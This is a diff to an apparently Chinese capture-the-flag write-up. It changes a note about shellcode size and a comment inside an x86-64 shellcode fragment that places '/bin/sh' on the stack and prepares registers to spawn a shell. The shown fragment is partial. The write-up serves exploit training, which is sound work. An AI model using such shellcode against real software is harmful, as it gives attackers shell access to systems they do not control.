@@ -19,7 +19,7 @@ gdb `vmmap`查看发现该区域可读写执行
 ## 踩过的坑
 
 1. 32位的int 0x80好像不能用，就算设置rax=0xb，也无法正常打开shell
-2. 不要用ascii转换器，2字节的shellcode可以转出76字节来
+2. 不要用ascii转换器，22字节的shellcode可以转出76字节来
 
 ## EXPLOIT
 
@@ -31,7 +31,7 @@ code = '''
 mov rbx, 0x68732f6e69622f   ; '/bin/sh'
 push rbx
 mov rdi, rsp                ; rsp现在指向栈上sh字符串位置
-xor esi, esi                ; 续：push rsp; pop rdi不行，有知道到原因的大佬可以开个discussion
+xor esi, esi                ; 如果push rsp再用ni会直接运行到底，建议使用si
 xor edx, edx
 mov qword ptr[rax], 0xf     ; rax -> 0x114514000
 nop                         ; preventing optimization
